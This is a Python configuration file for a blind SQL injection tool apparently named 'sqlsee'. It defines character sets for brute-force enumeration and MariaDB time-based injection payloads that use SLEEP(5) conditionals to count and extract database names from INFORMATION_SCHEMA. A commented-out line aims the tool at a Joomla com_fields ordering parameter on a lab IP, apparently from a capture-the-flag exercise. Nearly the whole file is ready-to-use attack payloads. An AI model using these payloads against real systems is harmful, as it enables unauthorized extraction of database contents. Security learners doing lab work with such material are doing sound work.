# Configuration for sqlsee
from enum import Enum


class Characters(Enum):
    """ Character sets for iteration """

    LOWER_LETTER = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']

    UPPER_LETTER = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']

    DIGITS = ['0','1','2','3','4','5','6','7','8','9']

    CHARS = ['.','/','-','_','#','!','$','&','*']

    ALL_CHARS = LOWER_LETTER + UPPER_LETTER + DIGITS + CHARS

    INSENSITIVE_CHARS = LOWER_LETTER + DIGITS + CHARS

class MariaDB(Enum):
    """ Queries for MariaDB """

    # Query to find number of databases.
    DATABASE_NUM = '(SELECT * FROM (SELECT IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) = {},(SELECT SLEEP(5)),0))GDiu)'

    # Query to find character set for database names.
    DATABASE_NAME_CHAR = '(SELECT * FROM (SELECT IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME LIKE (SELECT CONCAT(CONVERT(0x25 USING utf8), CONVERT({} USING utf8), CONVERT(0x25 USING utf8)))) > 0,(SELECT SLEEP(5)),0))GDiu)'

    # Query to find database names.
    DATABASE_NAME = '(SELECT * FROM (SELECT IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME LIKE (SELECT CONCAT({}CONVERT(0x25 USING utf8)))) > 0,(SELECT SLEEP(5)),0))GDiu)'

#daily_bugle = 'http://IP/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=' -H 'Host: 10.10.254.131, User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0, Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8, Accept-Language: en-US,en;q=0.5, Accept-Encoding: gzip,deflate, Connection: keep-alive, Cookie: , Upgrade-Insecure-Requests: 1, Cache-Control: max-age=0' -mDB -T -v
